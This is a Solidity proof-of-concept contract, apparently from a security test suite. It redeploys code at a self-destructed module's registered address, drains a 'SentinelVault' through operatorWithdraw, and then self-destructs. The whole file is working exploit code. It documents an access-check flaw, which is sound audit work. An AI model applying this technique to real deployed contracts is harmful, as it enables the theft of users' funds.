// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {ISentinelVault} from "../src/interfaces/ISentinelVault.sol";

/// @dev Deployed at the registered module address after EchoModule is self-destructed.
///      Because the vault only checks isRegistered (not code hash) in operatorWithdraw,
///      msg.sender (this address) passes the check and can drain the vault.
contract EvilModule {
    ISentinelVault immutable sentinelVault;


    constructor(ISentinelVault _sentinelVault) {
        // Just for testing, to check the length of the runtime code
         sentinelVault = _sentinelVault;
    }

    function exploit(address recipient) external {
        uint256 balance = address(sentinelVault).balance;
        require(balance > 0, "Vault is empty");

        sentinelVault.operatorWithdraw(recipient, balance);
        selfdestruct(payable(recipient));
    }
}
